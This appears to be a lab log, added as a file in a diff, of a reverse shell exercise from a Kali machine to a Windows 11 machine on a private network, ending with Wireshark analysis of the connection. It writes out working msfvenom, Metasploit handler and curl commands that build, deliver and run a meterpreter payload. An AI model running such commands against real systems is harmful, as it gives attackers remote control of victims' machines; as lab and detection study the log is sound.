@@ -1,0 +1,52 @@
+REVERSE SHELL ATTACK - COMMANDS I USED
+
+Date: 14 March 2026
+Setup: Kali (192.168.1.18) → Windows 11 (192.168.1.16)
+
+
+1. PAYLOAD CREATION (Kali Linux)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.18 LPORT=4444 -f exe -o shell.exe
+# This command creates a reverse shell payload. I set LHOST to my attacker IP and LPORT to 4444.
+
+2. HTTP SERVER (Kali Linux)
+python3 -m http.server 80
+# Started HTTP server so victim can download the payload file.
+
+3. METASPLOIT LISTENER (Kali Linux)
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.18
+set LPORT 4444
+exploit
+# Set up Metasploit listener. When victim runs the payload, this will catch the connection.
+
+4. PAYLOAD DOWNLOAD (Windows 11 - CMD Admin)
+curl http://192.168.1.18/shell.exe --output C:\Users\Public\shell.exe
+# Victim machine downloaded the payload from attacker.
+
+5. PAYLOAD EXECUTION (Windows 11)
+C:\Users\Public\shell.exe
+# Executed the payload. After this, meterpreter session was established.
+
+6. METERPRETER COMMANDS (After session)
+sysinfo
+# Checked victim system information.
+getuid
+# Checked current user privileges.
+
+7. WIRESHARK FILTER
+tcp.port == 4444
+# Used this filter to capture network traffic on port 4444.
+
+8. WIRESHARK ANALYSIS
+Source IP: 192.168.1.16 (Victim Windows)
+Destination IP: 192.168.1.18 (Attacker Kali)
+Source Port: 55616
+Destination Port: 4444
+Protocol: TCP (6)
+Flags: PSH, ACK
+Header Length: 20 bytes
+Window Size: 1602
+
+# Analyzed the captured packets in Wireshark. Found persistent TCP connection between victim and attacker on non-standard port 4444. This confirmed the reverse shell communication.
